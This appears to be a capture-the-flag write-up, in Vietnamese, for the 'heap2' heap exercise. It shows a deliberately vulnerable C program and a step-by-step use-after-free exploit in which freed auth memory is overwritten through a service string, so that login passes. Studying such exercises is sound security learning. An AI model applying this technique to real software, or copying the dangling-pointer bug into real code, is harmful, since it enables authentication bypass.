# **heap2**
## Source code
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv)
{
  char line[128];

  while(1) {
    printf("[ auth = %p, service = %p ]\n", auth, service);

    if(fgets(line, sizeof(line), stdin) == NULL) break;
    
    if(strncmp(line, "auth ", 5) == 0) {
      auth = malloc(sizeof(auth));
      memset(auth, 0, sizeof(auth));
      if(strlen(line + 5) < 31) {
        strcpy(auth->name, line + 5);
      }
    }
    if(strncmp(line, "reset", 5) == 0) {
      free(auth);
    }
    if(strncmp(line, "service", 6) == 0) {
      service = strdup(line + 7);
    }
    if(strncmp(line, "login", 5) == 0) {
      if(auth->auth) {
        printf("you have logged in already!\n");
      } else {
        printf("please enter your password\n");
      }
    }
  }
}
```

## Vulnerability
dangling pointer: tuy free(auth) nhưng con trỏ auth vẫn trỏ tới vùng đã được free.
## Exploit
- Cấp phát vùng nhớ cho auth:
```
auth 
[ auth = 0x804c008, service = (nil) ]
```
- free auth:
```
reset
[ auth = 0x804c008, service = (nil) ]
```
- Cấp phát vùng nhớ cho service, kèm theo một string dài để lúc cấp phát có copy vô đây luôn:
```
service AAAAAAAAAAAAAAAAAAAAAAAA
[ auth = 0x804c008, service = 0x804c018 ]
```
- Thử login:
```
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
```
- Thành công, do hiện tại auth->auth đang trỏ tới một chỗ của ở service.
# References
- dangling pointer: https://en.wikipedia.org/wiki/Dangling_pointer